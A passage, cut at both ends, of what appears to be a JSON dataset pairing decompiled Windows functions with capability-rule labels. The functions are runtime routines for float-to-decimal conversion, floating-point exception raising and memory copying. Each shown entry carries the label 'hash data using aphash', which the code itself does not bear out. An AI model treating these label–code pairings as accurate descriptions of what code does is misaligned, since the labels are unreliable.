_var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_1d4h) << 0x20;\n                                    uVar12 = 0;\n                                    puVar15 = NULL;\n                                    do {\n                                        uVar18 = (&var_1d0h)[puVar15];\n                                        uVar11 = ZEXT48(var_74ch) * uVar18;\n                                        (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                                        uVar12 = (ZEXT48(var_74ch) * uVar18 >> 0x20) + CARRY4(uVar11, uVar12);\n                                        puVar15 = puVar15 + 1;\n                                    } while (puVar15 != var_1d4h);\n                                    if (uVar12 != 0) {\n                                        if (0x72 < var_1d4h) {\ncode_r0x004dbc7c:\n                                            var_964h = NULL;\n                                            var_1d4h = NULL;\n                                            fcn.004dc577(&var_1d0h, 0x1cc, &var_960h, 0);\n                                            bVar4 = false;\n                                            goto code_r0x004dbbcb;\n                                        }\n                                        (&var_1d0h)[var_1d4h] = uVar12;\n                                        var_1d4h = var_1d4h + 1;\n                                    }\n                                }\n                            }\n                            else {\n                                var_750h = &var_570h;\n                                if (var_1d4h <= var_574h) {\n                                    var_750h = &var_1d0h;\n                                }\n                                var_74ch = &var_1d0h;\n                                puVar15 = var_1d4h;\n                                var_754h = var_574h;\n                                if (var_1d4h <= var_574h) {\n                                    var_74ch = &var_570h;\n                                    puVar15 = var_574h;\n                                    var_754h = var_1d4h;\n                                }\n                                var_1d4h = NULL;\n                                puVar20 = NULL;\n                                var_744h = NULL;\n                                if (var_754h != NULL) {\n                                    do {\n                                        if (var_750h[puVar20] == 0) {\n                                            if (puVar20 == var_1d4h) {\n                                                (&var_740h)[puVar20] = 0;\n                                                var_1d4h = puVar20 + 1;\n                                                var_744h = var_1d4h;\n                                            }\n                                        }\n                                        else {\n                                            var_748h = NULL;\n                                            var_770h = NULL;\n                                            puVar14 = puVar20;\n                                            if (puVar15 != NULL) {\n                                                do {\n                                                    puVar17 = var_770h;\n                                                    if (puVar14 == 0x73) break;\n                                                    if (puVar14 == var_1d4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = var_748h + 1 + puVar20;\n                                                    }\n                                                    uVar12 = var_74ch[var_748h];\n                                                    uVar18 = var_750h[puVar20];\n                                                    uVar11 = uVar12 * uVar18;\n                                                    pcVar10 = uVar11 + var_770h;\n                                                    ppcVar1 = &var_740h + puVar14;\n                                                    pcVar21 = *ppcVar1;\n                                                    *ppcVar1 = *ppcVar1 + pcVar10;\n                                                    puVar17 = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar11, var_770h) +\n                                                              CARRY4(pcVar21, pcVar10);\n                                                    var_748h = var_748h + 1;\n                                                    puVar14 = puVar14 + 1;\n                                                    var_1d4h = var_744h;\n                                                    var_770h = puVar17;\n                                                } while (var_748h != puVar15);\n                                                do {\n                                                    if (puVar17 == NULL) break;\n                                                    if (puVar14 == 0x73) goto code_r0x004dbc7c;\n                                                    if (puVar14 == var_1d4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = puVar14 + 1;\n                                                    }\n                                                    ppcVar1 = &var_740h + puVar14;\n                                                    pcVar21 = *ppcVar1;\n                                                    *ppcVar1 = *ppcVar1 + puVar17;\n                                                    puVar17 = CARRY4(pcVar21, puVar17);\n                                                    puVar14 = puVar14 + 1;\n                                                    var_1d4h = var_744h;\n                                                } while( true );\n                                            }\n                                            if (puVar14 == 0x73) goto code_r0x004dbc7c;\n                                        }\n                                        puVar20 = puVar20 + 1;\n                                    } while (puVar20 != var_754h);\n                                }\n                                puVar20 = var_1d4h << 2;\n                                puVar15 = &var_740h;\ncode_r0x004dbbb8:\n                                fcn.004dc577(&var_1d0h, 0x1cc, puVar15, puVar20);\n                            }\n                            bVar4 = true;\n                        }\ncode_r0x004dbbcb:\n                        if (!bVar4) goto code_r0x004dbcca;\n                    }\n                    if (var_77ch != NULL) {\n                        uVar12 = *(var_77ch * 4 + 0x55849c);\n                        _var_75ch = _var_75ch & 0xffffffff | uVar12 << 0x20;\n                        if (uVar12 == 0) {\ncode_r0x004dbcca:\n                            var_1d4h = NULL;\n                            puVar15 = &var_1d0h;\n                            goto code_r0x004dbcd7;\n                        }\n                        if ((uVar12 != 1) && (var_1d4h != NULL)) {\n                            var_74ch = NULL;\n                            puVar15 = NULL;\n                            do {\n                                uVar18 = (&var_1d0h)[puVar15];\n                                uVar11 = uVar12 * uVar18;\n                                (&var_1d0h)[puVar15] = uVar11 + var_74ch;\n                                var_74ch = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar11, var_74ch);\n                                puVar15 = puVar15 + 1;\n                            } while (puVar15 != var_1d4h);\n                            if (var_74ch != NULL) {\n                                if (0x72 < var_1d4h) goto code_r0x004dbcca;\n                                (&var_1d0h)[var_1d4h] = var_74ch;\n                                var_1d4h = var_1d4h + 1;\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_77ch = var_76ch % 10;\n                    for (var_74ch = var_76ch / 10; var_74ch != NULL; var_74ch = var_74ch - var_750h) {\n                        var_750h = var_74ch;\n                        if (0x26 < var_74ch) {\n                            var_750h = 0x26;\n                        }\n                        uVar12 = *(var_750h * 4 + 0x5583e6);\n                        uVar18 = *(var_750h * 4 + 0x5583e7);\n                        var_574h = uVar12 + uVar18;\n                        fcn.00403189(&var_570h);\n                        fcn.00405830(&var_570h + uVar12, *(var_750h * 4 + 0x5583e4) * 4 + 0x557910, uVar18 << 2);\n                        if (var_574h < 0x2) {\n                            if (var_570h == 0) {\n                                var_744h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004dc577(&var_3a0h, 0x1cc, &var_740h, 0);\n                            }\n                            else if ((var_570h != 1) && (var_3a4h != NULL)) {\n                                pcVar21 = NULL;\n                                _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_3a4h) << 0x20;\n                                puVar15 = NULL;\n                                do {\n                                    pcVar10 = apcStack928[puVar15 + -1];\n                                    uVar12 = var_570h * ZEXT48(pcVar10);\n                                    apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                                    pcVar21 = (var_570h * ZEXT48(pcVar10) >> 0x20) + CARRY4(uVar12, pcVar21);\n                                    puVar15 = puVar15 + 1;\n                                } while (puVar15 != var_3a4h);\n                                if (pcVar21 == NULL) goto code_r0x004db3f4;\n                                if (var_3a4h < 0x73) {\n                                    apcStack928[var_3a4h + -1] = pcVar21;\n                                    var_3a4h = var_3a4h + 1;\n                                    goto code_r0x004db3f4;\n                                }\n                                var_574h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004dc577(&var_3a0h, 0x1cc, &var_570h, 0);\n                                bVar4 = false;\n                                goto code_r0x004db702;\n                            }\ncode_r0x004db3f4:\n                            bVar4 = true;\n                        }\n                        else {\n                            if (var_3a4h < 0x2) {\n                                var_754h = var_3a0h;\n                                var_3a4h = var_574h;\n                                fcn.004dc577(&var_3a0h, 0x1cc, &var_570h, var_574h << 2);\n                                if (var_754h == NULL) {\n                                    var_574h = var_754h;\n                                    var_3a4h = var_754h;\n                                    puVar15 = &var_570h;\n                                    puVar20 = var_754h;\n                                    goto code_r0x004db6ef;\n                                }\n                                if ((var_754h != 0x1) && (var_3a4h != NULL)) {\n                                    _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_3a4h) << 0x20;\n                                    pcVar21 = NULL;\n                                    puVar15 = NULL;\n                                    do {\n                                        pcVar10 = apcStack928[puVar15 + -1];\n                                        uVar12 = ZEXT48(var_754h) * ZEXT48(pcVar10);\n                                        apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                                        pcVar21 = (ZEXT48(var_754h) * ZEXT48(pcVar10) >> 0x20) + CARRY4(uVar12, pcVar21)\n                                        ;\n                                        puVar15 = puVar15 + 1;\n                                    } while (puVar15 != var_3a4h);\n                                    if (pcVar21 != NULL) {\n                                        if (0x72 < var_3a4h) {\n                                            var_574h = NULL;\n                                            puVar15 = &var_570h;\ncode_r0x004db768:\n                                            var_3a4h = NULL;\n                                            fcn.004dc577(&var_3a0h, 0x1cc, puVar15, 0);\n                                            bVar4 = false;\n                                            goto code_r0x004db702;\n                                        }\n                                        apcStack928[var_3a4h + -1] = pcVar21;\n                                        var_3a4h = var_3a4h + 1;\n                                    }\n                                }\n                            }\n                            else {\n                                var_768h = &var_570h;\n                                if (var_3a4h <= var_574h) {\n                                    var_768h = &var_3a0h;\n                                }\n                                var_754h = &var_3a0h;\n                                puVar15 = var_3a4h;\n                                var_770h = var_574h;\n                                if (var_3a4h <= var_574h) {\n                                    var_754h = &var_570h;\n                                    puVar15 = var_574h;\n                                    var_770h = var_3a4h;\n                                }\n                                var_3a4h = NULL;\n                                puVar20 = NULL;\n                                var_744h = NULL;\n                                if (var_770h != NULL) {\n                                    do {\n                                        if (var_768h[puVar20] == 0) {\n                                            if (puVar20 == var_3a4h) {\n                                                (&var_740h)[puVar20] = 0;\n                                                var_3a4h = puVar20 + 1;\n                                                var_744h = var_3a4h;\n                                            }\n                                        }\n                                        else {\n                                            var_748h = NULL;\n                                            var_760h = NULL;\n                                            puVar14 = puVar20;\n                                            if (puVar15 != NULL) {\n                                                do {\n                                                    puVar16 = var_760h;\n                                                    if (puVar14 == 0x73) break;\n                                                    if (puVar14 == var_3a4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = var_748h + 1 + puVar20;\n                                                    }\n                                                    uVar12 = var_754h[var_748h];\n                                                    uVar18 = var_768h[puVar20];\n                                                    uVar8 = uVar12 * uVar18;\n                                                    puVar9 = uVar8 + var_760h;\n                                                    puVar16 = &var_740h + puVar14;\n                                                    uVar11 = *puVar16;\n                                                    *puVar16 = puVar9 + *puVar16;\n                                                    puVar16 = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar8, var_760h) +\n                                                              CARRY4(uVar11, puVar9);\n                                                    var_748h = var_748h + 1;\n                                                    puVar14 = puVar14 + 1;\n                                                    var_3a4h = var_744h;\n                                                    var_760h = puVar16;\n                                                } while (var_748h != puVar15);\n                                                do {\n                                                    if (puVar16 == NULL) break;\n                                                    if (puVar14 == 0x73) goto code_r0x004db74e;\n                                                    if (puVar14 == var_3a4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = puVar14 + 1;\n                                                    }\n                                                    puVar19 = &var_740h + puVar14;\n                                                    uVar12 = *puVar19;\n                                                    *puVar19 = *puVar19 + puVar16;\n                                                    puVar16 = CARRY4(uVar12, puVar16);\n                                                    puVar14 = puVar14 + 1;\n                                                    var_3a4h = var_744h;\n                                                } while( true );\n                                            }\n                                            if (puVar14 == 0x73) {\ncode_r0x004db74e:\n                                                var_964h = NULL;\n                                                puVar15 = &var_960h;\n                                                goto code_r0x004db768;\n                                            }\n                                        }\n                                        puVar20 = puVar20 + 1;\n                                    } while (puVar20 != var_770h);\n                                }\n                                puVar20 = var_3a4h << 2;\n                                puVar15 = &var_740h;\ncode_r0x004db6ef:\n                                fcn.004dc577(&var_3a0h, 0x1cc, puVar15, puVar20);\n                            }\n                            bVar4 = true;\n                        }\ncode_r0x004db702:\n                        if (!bVar4) goto code_r0x004db78d;\n                    }\n                    if (var_77ch != NULL) {\n                        uVar12 = *(var_77ch * 4 + 0x55849c);\n                        _var_75ch = _var_75ch & 0xffffffff | uVar12 << 0x20;\n                        if (uVar12 == 0) {\ncode_r0x004db78d:\n                            var_3a4h = NULL;\n                            puVar15 = &var_3a0h;\ncode_r0x004dbcd7:\n                            var_964h = NULL;\n                            fcn.004dc577(puVar15, 0x1cc, &var_960h, 0);\n                        }\n                        else if ((uVar12 != 1) && (var_3a4h != NULL)) {\n                            var_74ch = NULL;\n                            puVar15 = NULL;\n                            do {\n                                pcVar21 = apcStack928[puVar15 + -1];\n                                uVar18 = uVar12 * ZEXT48(pcVar21);\n                                apcStack928[puVar15 + -1] = uVar18 + var_74ch;\n                                var_74ch = (uVar12 * ZEXT48(pcVar21) >> 0x20) + CARRY4(uVar18, var_74ch);\n                                puVar15 = puVar15 + 1;\n                            } while (puVar15 != var_3a4h);\n                            if (var_74ch != NULL) {\n                                if (0x72 < var_3a4h) goto code_r0x004db78d;\n                                apcStack928[var_3a4h + -1] = var_74ch;\n                                var_3a4h = var_3a4h + 1;\n                            }\n                        }\n                    }\n                }\n                puVar15 = var_764h;\n                var_748h = var_764h;\n                if (var_1d4h != NULL) {\n                    var_74ch = NULL;\n                    puVar20 = NULL;\n                    do {\n                        uVar12 = (&var_1d0h)[puVar20];\n                        uVar18 = uVar12 * 10;\n                        (&var_1d0h)[puVar20] = uVar18 + var_74ch;\n                        var_74ch = (uVar12 * 10 >> 0x20) + CARRY4(uVar18, var_74ch);\n                        puVar20 = puVar20 + 1;\n                    } while (puVar20 != var_1d4h);\n                    if (var_74ch != NULL) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = var_74ch;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                        else {\n                            var_964h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004dc577(&var_1d0h, 0x1cc, &var_960h, 0);\n                        }\n                    }\n                }\n                iVar7 = fcn.00404818(&var_1d4h, &var_3a4h);\n                puVar20 = var_764h;\n                if (iVar7 == 10) {\n                    var_748h = var_764h + 1;\n                    var_76ch = var_76ch + 1;\n                    *var_764h = '1';\n                    uVar2 = _var_75ch & 0xffffffff;\n                    _var_75ch = uVar2 | ZEXT48(var_3a4h) << 0x20;\n                    if (var_3a4h != NULL) {\n                        pcVar21 = NULL;\n                        puVar15 = NULL;\n                        do {\n                            pcVar10 = apcStack928[puVar15 + -1];\n                            uVar12 = ZEXT48(pcVar10) * 10;\n                            apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                            pcVar21 = (ZEXT48(pcVar10) * 10 >> 0x20) + CARRY4(uVar12, pcVar21);\n                            puVar15 = puVar15 + 1;\n                        } while (puVar15 != var_3a4h);\n                        _var_75ch = uVar2 | ZEXT48(pcVar21) << 0x20;\n                        if (pcVar21 != NULL) {\n                            if (var_3a4h < 0x73) {\n                                apcStack928[var_3a4h + -1] = pcVar21;\n                                var_3a4h = var_3a4h + 1;\n                            }\n                            else {\n                                var_964h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004dc577(&var_3a0h, 0x1cc, &var_960h, 0);\n                            }\n                        }\n                    }\ncode_r0x004dbe18:\n                    puVar15 = puVar20 + 1;\n                    uVar12 = var_76ch;\n                }\n                else {\n                    if (iVar7 != 0) {\n                        var_748h = var_764h + 1;\n                        *var_764h = iVar7 + '0';\n                        goto code_r0x004dbe18;\n                    }\n                    uVar12 = var_76ch - 1;\n                }\n                var_784h[1] = uVar12;\n                uVar18 = var_778h;\n                if ((-1 < uVar12) && (var_778h < 0x80000000)) {\n                    uVar18 = var_778h + uVar12;\n                }\n                uVar12 = arg_1ch - 1U;\n                if (uVar18 <= arg_1ch - 1U) {\n                    uVar12 = uVar18;\n                }\n                var_74ch = uVar12 + var_764h;\n                if (puVar15 != var_74ch) {\n                    do {\n                        puVar20 = var_748h;\n                        if (var_1d4h == NULL) break;\n                        uVar12 = 0;\n                        puVar15 = NULL;\n                        do {\n                            uVar18 = (&var_1d0h)[puVar15];\n                            uVar11 = uVar18 * 1000000000;\n                            (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                            uVar12 = (uVar18 * 1000000000 >> 0x20) + CARRY4(uVar11, uVar12);\n                            puVar15 = puVar15 + 1;\n                        } while (puVar15 != var_1d4h);\n                        if (uVar12 != 0) {\n                            if (var_1d4h < 0x73) {\n                                (&var_1d0h)[var_1d4h] = uVar12;\n                                var_1d4h = var_1d4h + 1;\n                            }\n                            else {\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004dc577(&var_1d0h, 0x1cc, &var_960h, 0);\n                            }\n                        }\n                        var_77ch = fcn.00404818(&var_1d4h, &var_3a4h);\n                        bVar22 = var_1d4h == NULL;\n                        var_778h = 8;\n                        uVar12 = var_74ch - puVar20;\n                        do {\n                            uVar2 = ZEXT48(var_77ch);\n                            var_77ch = var_77ch / var_774h;\n                            _var_75ch = _var_75ch & 0xffffffff | uVar2 % ZEXT48(var_774h) << 0x20;\n                            cVar5 = uVar2 % ZEXT48(var_774h) + '0';\n                            if (uVar12 < var_778h) {\n                                bVar22 = bVar22 & cVar5 == '0';\n                            }\n                            else {\n                                *(var_778h + puVar20) = cVar5;\n                            }\n                            var_778h = var_778h - 1;\n                        } while (var_778h != 0xffffffff);\n                        if (9 < uVar12) {\n                            uVar12 = 9;\n                        }\n                        puVar15 = puVar20 + uVar12;\n                        var_748h = puVar15;\n                    } while (puVar15 != var_74ch);\n                }\n                *puVar15 = '\\0';\n                _var_75ch = CONCAT14(bVar22, var_75ch);\n                goto code_r0x004dc002;\n            }\n            pcVar21 = \"1#IND\";\n        }\ncode_r0x004dac07:\n        iVar7 = fcn.0040605a(var_764h, arg_1ch, pcVar21);\n    }\n    if (iVar7 != 0) {\n        fcn.0040366b(0, 0, 0, 0, 0);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\ncode_r0x004dc002:\n    if (var_788h != '\\0') {\n        fcn.0040451b(&var_790h);\n    }\n    fcn.004030bc(var_964h);\n    return;\n}\n",
        "token_count": 10889
    },
    "004055b0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004055b0(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, ulong *arg_18h, ulong *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    puVar1 = arg_ch;\n    arg_8h[1] = 0;\n    uVar4 = 0xc000000d;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    if ((arg_10h & 0x10) != 0) {\n        uVar4 = 0xc000008f;\n        arg_8h[1] = arg_8h[1] | 1;\n    }\n    if ((arg_10h & 2) != 0) {\n        uVar4 = 0xc0000093;\n        arg_8h[1] = arg_8h[1] | 2;\n    }\n    if ((arg_10h & 1) != 0) {\n        uVar4 = 0xc0000091;\n        arg_8h[1] = arg_8h[1] | 4;\n    }\n    if ((arg_10h & 4) != 0) {\n        uVar4 = 0xc000008e;\n        arg_8h[1] = arg_8h[1] | 8;\n    }\n    if ((arg_10h & 8) != 0) {\n        uVar4 = 0xc0000090;\n        arg_8h[1] = arg_8h[1] | 0x10;\n    }\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch << 4) ^ arg_8h[2]) & 0x10;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch * 2) ^ arg_8h[2]) & 8;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 1) ^ arg_8h[2]) & 4;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 3) ^ arg_8h[2]) & 2;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 5) ^ arg_8h[2]) & 1;\n    uVar3 = fcn.00402cb1();\n    puVar2 = arg_1ch;\n    if ((uVar3 & 1) != 0) {\n        arg_8h[3] = arg_8h[3] | 0x10;\n    }\n    if ((uVar3 & 4) != 0) {\n        arg_8h[3] = arg_8h[3] | 8;\n    }\n    if ((uVar3 & 8) != 0) {\n        arg_8h[3] = arg_8h[3] | 4;\n    }\n    if ((uVar3 & 0x10) != 0) {\n        arg_8h[3] = arg_8h[3] | 2;\n    }\n    if ((uVar3 & 0x20) != 0) {\n        arg_8h[3] = arg_8h[3] | 1;\n    }\n    uVar3 = *puVar1 & 0xc00;\n    if (uVar3 == 0) {\n        *arg_8h = *arg_8h & 0xfffffffc;\n    }\n    else {\n        if (uVar3 == 0x400) {\n            uVar3 = *arg_8h & 0xfffffffd | 1;\n        }\n        else {\n            if (uVar3 != 0x800) {\n                if (uVar3 == 0xc00) {\n                    *arg_8h = *arg_8h | 3;\n                }\n                goto code_r0x004c3671;\n            }\n            uVar3 = *arg_8h & 0xfffffffe | 2;\n        }\n        *arg_8h = uVar3;\n    }\ncode_r0x004c3671:\n    uVar3 = *puVar1 & 0x300;\n    if (uVar3 == 0) {\n        uVar3 = *arg_8h & 0xffffffeb | 8;\ncode_r0x004c36a7:\n        *arg_8h = uVar3;\n    }\n    else {\n        if (uVar3 == 0x200) {\n            uVar3 = *arg_8h & 0xffffffe7 | 4;\n            goto code_r0x004c36a7;\n        }\n        if (uVar3 == 0x300) {\n            *arg_8h = *arg_8h & 0xffffffe3;\n        }\n    }\n    *arg_8h = *arg_8h ^ (arg_14h << 5 ^ *arg_8h) & 0x1ffe0;\n    arg_8h[8] = arg_8h[8] | 1;\n    if (arg_20h == 0) {\n        arg_8h[8] = arg_8h[8] & 0xffffffe3 | 2;\n        *(arg_8h + 4) = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe3 | 2;\n        *(arg_8h + 0x14) = *arg_1ch;\n    }\n    else {\n        arg_8h[8] = arg_8h[8] & 0xffffffe1;\n        arg_8h[4] = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe1;\n        arg_8h[0x14] = *arg_1ch;\n    }\n    fcn.0040187f();\n    (*_sym.imp.KERNEL32.dll_RaiseException)(uVar4, 0, 1, &arg_8h);\n    uVar3 = arg_8h[2];\n    if ((uVar3 & 0x10) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffe;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 8) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffb;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 4) != 0) {\n        *puVar1 = *puVar1 & 0xfffffff7;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 2) != 0) {\n        *puVar1 = *puVar1 & 0xffffffef;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 1) != 0) {\n        *puVar1 = *puVar1 & 0xffffffdf;\n    }\n    uVar3 = *arg_8h & 3;\n    if (uVar3 == 0) {\n        *puVar1 = *puVar1 & 0xfffff3ff;\n    }\n    else {\n        if (uVar3 == 1) {\n            uVar3 = *puVar1 & 0xfffff7ff | 0x400;\n        }\n        else {\n            if (uVar3 != 2) {\n                if (uVar3 == 3) {\n                    *puVar1 = *puVar1 | 0xc00;\n                }\n                goto code_r0x004c37bd;\n            }\n            uVar3 = *puVar1 & 0xfffffbff | 0x800;\n        }\n        *puVar1 = uVar3;\n    }\ncode_r0x004c37bd:\n    uVar3 = *arg_8h >> 2 & 7;\n    if (uVar3 == 0) {\n        uVar3 = *puVar1 & 0xfffff3ff | 0x300;\n    }\n    else {\n        if (uVar3 != 1) {\n            if (uVar3 == 2) {\n                *puVar1 = *puVar1 & 0xfffff3ff;\n            }\n            goto code_r0x004c37ee;\n        }\n        uVar3 = *puVar1 & 0xfffff3ff | 0x200;\n    }\n    *puVar1 = uVar3;\ncode_r0x004c37ee:\n    if (arg_20h == 0) {\n        *puVar2 = *(arg_8h + 0x14);\n    }\n    else {\n        *puVar2 = arg_8h[0x14];\n    }\n    return;\n}\n",
        "token_count": 2104
    },
    "004057bd": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057bd(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00403f71(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00405830": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.00405830(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    int32_t iVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    ulong *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    ulong *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint uVar42;\n    uint uVar43;\n    uint uVar44;\n    uint64_t uVar45;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar37 = param_2 + param_3;\n        puVar40 = param_1 + param_3;\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            if ((*0x571c9c >> 1 & 1) == 0) {\n                if ((puVar40 & 3) != 0) {\n                    uVar33 = puVar40 & 3;\n                    param_3 = param_3 - uVar33;\n                    do {\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 - 1;\n                        uVar33 = uVar33 - 1;\n                    } while (uVar33 != 0);\n                }\n                if (0x1f < param_3) {\n                    uVar33 = param_3 >> 2;\n                    while( true ) {\n                        if (uVar33 == 0) break;\n                        uVar33 = uVar33 - 1;\n                        puVar40[-1] = puVar37[-1];\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 + -1;\n                    }\n    // switch table (4 cases) at 0x485650\n                    switch(param_3 & 3) {\n                    case 0:\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 1:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 2:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 3:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        *(puVar40 - 3) = *(puVar37 + -3);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    }\n                }\n            }\n            else {\n                while (puVar38 = puVar37,  puVar41 = puVar40,  (puVar40 & 0xf) != 0) {\n                    puVar37 = puVar37 + -1;\n                    puVar40 = puVar40 + -1;\n                    *puVar40 = *puVar37;\n                    param_3 = param_3 - 1;\n                }\n                do {\n                    puVar37 = puVar38;\n                    puVar40 = puVar41;\n                    if (param_3 < 0x80) break;\n                    puVar37 = puVar38 + -0x20;\n                    puVar40 = puVar41 + -0x20;\n                    uVar42 = puVar38[-0x1f];\n                    uVar43 = puVar38[-0x1e];\n                    uVar44 = puVar38[-0x1d];\n                    uVar4 = puVar38[-0x1c];\n                    uVar5 = puVar38[-0x1b];\n                    uVar6 = puVar38[-0x1a];\n                    uVar7 = puVar38[-0x19];\n                    uVar8 = puVar38[-0x18];\n                    uVar9 = puVar38[-0x17];\n                    uVar10 = puVar38[-0x16];\n                    uVar11 = puVar38[-0x15];\n                    uVar12 = puVar38[-0x14];\n                    uVar13 = puVar38[-0x13];\n                    uVar14 = puVar38[-0x12];\n                    uVar15 = puVar38[-0x11];\n                    uVar16 = puVar38[-0x10];\n                    uVar17 = puVar38[-0xf];\n                    uVar18 = puVar38[-0xe];\n                    uVar19 = puVar38[-0xd];\n                    uVar20 = puVar38[-0xc];\n                    uVar21 = puVar38[-0xb];\n                    uVar22 = puVar38[-10];\n                    uVar23 = puVar38[-9];\n                    uVar24 = puVar38[-8];\n                    uVar25 = puVar38[-7];\n                    uVar26 = puVar38[-6];\n                    uVar27 = puVar38[-5];\n                    uVar28 = puVar38[-4];\n                    uVar29 = puVar38[-3];\n                    uVar30 = puVar38[-2];\n                    uVar31 = puVar38[-1];\n                    *puVar40 = *puVar37;\n                    puVar41[-0x1f] = uVar42;\n                    puVar41[-0x1e] = uVar43;\n                    puVar41[-0x1d] = uVar44;\n                    puVar41[-0x1c] = uVar4;\n                    puVar41[-0x1b] = uVar5;\n                    puVar41[-0x1a] = uVar6;\n                    puVar41[-0x19] = uVar7;\n                    puVar41[-0x18] = uVar8;\n                    puVar41[-0x17] = uVar9;\n                    puVar41[-0x16] = uVar10;\n                    puVar41[-0x15] = uVar11;\n                    puVar41[-0x14] = uVar12;\n                    puVar41[-0x13] = uVar13;\n                    puVar41[-0x12] = uVar14;\n                    puVar41[-0x11] = uVar15;\n                    puVar41[-0x10] = uVar16;\n                    puVar41[-0xf] = uVar17;\n                    puVar41[-0xe] = uVar18;\n                    puVar41[-0xd] = uVar19;\n                    puVar41[-0xc] = uVar20;\n                    puVar41[-0xb] = uVar21;\n                    puVar41[-10] = uVar22;\n                    puVar41[-9] = uVar23;\n                    puVar41[-8] = uVar24;\n                    puVar41[-7] = uVar25;\n                    puVar41[-6] = uVar26;\n                    puVar41[-5] = uVar27;\n                    puVar41[-4] = uVar28;\n                    puVar41[-3] = uVar29;\n                    puVar41[-2] = uVar30;\n                    puVar41[-1] = uVar31;\n                    param_3 = param_3 - 0x80;\n                    puVar38 = puVar37;\n                    puVar41 = puVar40;\n                } while ((param_3 & 0xffffff80) != 0);\n                puVar38 = puVar37;\n                puVar41 = puVar40;\n                if (0x1f < param_3) {\n                    do {\n                        puVar37 = puVar38 + -8;\n                        puVar40 = puVar41 + -8;\n                        uVar42 = puVar38[-7];\n                        uVar43 = puVar38[-6];\n                        uVar44 = puVar38[-5];\n                        uVar4 = puVar38[-4];\n                        uVar5 = puVar38[-3];\n                        uVar6 = puVar38[-2];\n                        uVar7 